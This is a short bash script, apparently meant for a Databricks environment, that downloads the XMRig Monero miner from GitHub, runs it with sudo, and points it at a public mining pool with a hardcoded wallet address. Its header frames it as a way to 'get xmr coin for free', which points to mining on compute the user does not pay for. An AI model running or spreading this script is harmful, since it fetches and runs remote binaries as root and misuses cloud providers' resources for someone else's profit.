#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz 
tar xvzf xmrig-6.16.4-linux-static-x64.tar.gz 
cd xmrig-6.16.4
rm config.json
sudo sysctl -w vm.nr_hugepages=1024
sudo ./xmrig -o xmrpool.eu:9999 -u 49fYvmBsirkT53ErUyJ59Qa4kxcs6xmq3RTXNvMfQdUSbbSzYRFu3rNPY2JLpgg1tzeqarroWgPUqLDKmn9t7vsr6U11gnG -k --tls
